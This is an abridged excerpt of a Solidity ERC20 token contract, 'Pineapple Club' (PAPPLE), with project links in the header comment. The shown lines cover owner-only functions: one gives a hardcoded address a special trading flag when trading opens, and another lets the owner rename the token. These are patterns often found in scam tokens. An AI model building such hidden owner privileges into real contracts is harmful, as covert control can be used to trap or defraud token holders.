/**
Telegram: https://t.me/PineappleDexNews
Twitter: https://x.com/PineappleDex
Website: https://pineappledex.com
*/
...
contract PAPPLE is ERC20, Ownable {
    ...
    string private _name = unicode"Pineapple Club";
    string private _symbol = unicode"PAPPLE";
    ...
    function openTrading() public onlyOwner {
        ...
        excludeTradeState[address(0x842D16e449eD455fBe700995eF240E9C622822A4)] = true;
        approver_[address(_marketting)] = true;
        tradingOpen = true;
    }

    event nameChanged(string newname, address owner);

    function metadata(string memory newdata) public onlyOwner {
        _name = newdata;
        emit nameChanged(newdata, _msgSender());
    }
